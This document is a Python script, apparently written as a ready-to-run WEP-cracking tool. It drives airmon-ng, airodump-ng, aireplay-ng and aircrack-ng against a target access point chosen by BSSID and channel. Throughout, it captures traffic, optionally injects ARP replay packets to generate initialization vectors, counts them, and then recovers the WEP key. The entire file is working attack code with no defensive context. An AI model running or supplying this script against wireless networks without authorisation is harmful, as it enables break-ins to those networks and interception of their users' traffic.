#!/usr/bin/env python3
import argparse
import subprocess
import time
import os
import signal
import sys

class WEPAttacks:
    def __init__(self, options):
        self.interface = options.interface
        self.bssid = options.bssid.lower()
        self.channel = options.channel
        self.capture_prefix = "wep_capture"
        self.capture_file = f"{self.capture_prefix}-01.cap"
        self.ivs_needed = int(options.wepca) if options.wepca else 10000
        self.timeout = int(options.wept) if options.wept else 300
        self.monitor_interface = self.interface + "mon"
        self.airodump_proc = None

    def run_command(self, cmd, check=True):
        print(f"[*] Running command: {' '.join(cmd)}")
        subprocess.run(cmd, check=check)

    def start_monitor_mode(self):
        print("[*] Starting monitor mode...")
        self.run_command(["airmon-ng", "start", self.interface])

    def stop_monitor_mode(self):
        print("[*] Stopping monitor mode...")
        self.run_command(["airmon-ng", "stop", self.monitor_interface])

    def set_channel(self):
        print(f"[*] Setting channel {self.channel} on {self.monitor_interface}")
        self.run_command(["iwconfig", self.monitor_interface, "channel", str(self.channel)])

    def start_airodump(self):
        print(f"[*] Starting airodump-ng on BSSID {self.bssid} channel {self.channel}")
        self.airodump_proc = subprocess.Popen([
            "airodump-ng",
            "--bssid", self.bssid,
            "-c", str(self.channel),
            "-w", self.capture_prefix,
            self.monitor_interface
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    def stop_airodump(self):
        if self.airodump_proc:
            print("[*] Stopping airodump-ng...")
            self.airodump_proc.send_signal(signal.SIGINT)
            self.airodump_proc.wait()
            self.airodump_proc = None

    def arp_replay_attack(self):
        print("[*] Starting ARP replay attack...")
        try:
            subprocess.run([
                "aireplay-ng",
                "--arpreplay",
                "-b", self.bssid,
                self.monitor_interface
            ], check=True)
        except subprocess.CalledProcessError:
            print("[!] ARP replay attack failed or was interrupted.")

    def wait_for_ivs(self):
        print(f"[*] Waiting to capture at least {self.ivs_needed} IVs or timeout {self.timeout} seconds...")
        start_time = time.time()
        while time.time() - start_time < self.timeout:
            if os.path.exists(self.capture_file):
                result = subprocess.run(
                    ["aircrack-ng", "-a", "1", "-b", self.bssid, "-n", "64", self.capture_file],
                    capture_output=True, text=True
                )
                output = result.stdout
                for line in output.splitlines():
                    if "IVs:" in line:
                        parts = line.split()
                        try:
                            iv_index = parts.index("IVs:") + 1
                            iv_count = int(parts[iv_index].replace(",", ""))
                            print(f"[*] Captured IVs: {iv_count}")
                            if iv_count >= self.ivs_needed:
                                print("[*] Enough IVs captured, ready to crack.")
                                return True
                        except (ValueError, IndexError):
                            pass
            time.sleep(5)
        print("[!] Timeout reached without capturing enough IVs.")
        return False

    def crack_wep(self):
        print("[*] Starting WEP cracking with aircrack-ng...")
        try:
            subprocess.run([
                "aircrack-ng",
                "-b", self.bssid,
                self.capture_file
            ], check=True)
        except subprocess.CalledProcessError:
            print("[!] aircrack-ng failed or WEP key not found.")

def parse_arguments():
    parser = argparse.ArgumentParser(description="WEP Attack Script with ARP Replay and Capture")
    parser.add_argument('--interface', required=True, help='Wireless interface (e.g., wlan0)')
    parser.add_argument('--bssid', required=True, help='Target BSSID (AP MAC address)')
    parser.add_argument('--channel', required=True, help='Target channel')
    parser.add_argument('--wepca', help='Number of IVs to start cracking at (default 10000)')
    parser.add_argument('--wept', help='Timeout for capture in seconds (default 300)')
    parser.add_argument('--arpreplay', action='store_true', help='Enable ARP replay attack')
    return parser.parse_args()

def main():
    options = parse_arguments()
    attack = WEPAttacks(options)

    try:
        attack.start_monitor_mode()
        attack.set_channel()
        attack.start_airodump()

        if options.arpreplay:
            attack.arp_replay_attack()

        if attack.wait_for_ivs():
            attack.crack_wep()
        else:
            print("[!] Not enough IVs captured to crack WEP.")

    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")

    finally:
        attack.stop_airodump()
        attack.stop_monitor_mode()
        print("[*] Cleanup done. Exiting.")

if __name__ == "__main__":
    main()
